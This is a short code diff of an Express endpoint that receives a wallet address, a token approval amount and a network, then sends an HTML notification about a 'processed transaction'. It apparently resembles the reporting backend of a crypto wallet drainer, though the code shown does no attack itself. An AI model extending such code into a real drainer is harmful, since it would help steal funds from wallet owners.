@@ -1,9 +1,10 @@
-const express = require("express"); 
-sendNotification } = require("../helper/utils");
+const express = require("express");
+const { sendNotification } = require("../helper/utils");
 const router = express.Router();
 
 router.post("/", async (req, res) => {
   const { approval_amount, token_symbol, currentNetwork, walletAddress } = req.body;
+
   try {
     let text = '';
     text = `🚀 <b>Transaction Processed</b> 🚀\n\n` +
@@ -12,10 +13,11 @@ router.post("/", async (req, res) => {
            `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
            `⚡️ <b>Network</b>: ${currentNetwork}\n\n\n` +
            `🔗 <a href="https://www.blockchain.com/explorer/search?search=${walletAddress}">See Wallet On Block Explorer</a>`;
+
     if (text.length > 0) {
       await sendNotification(text, 'html');
       res.status(200).json({
-        result: "success"
+        result: approval_amount
       });
     } else {
       throw "failed";
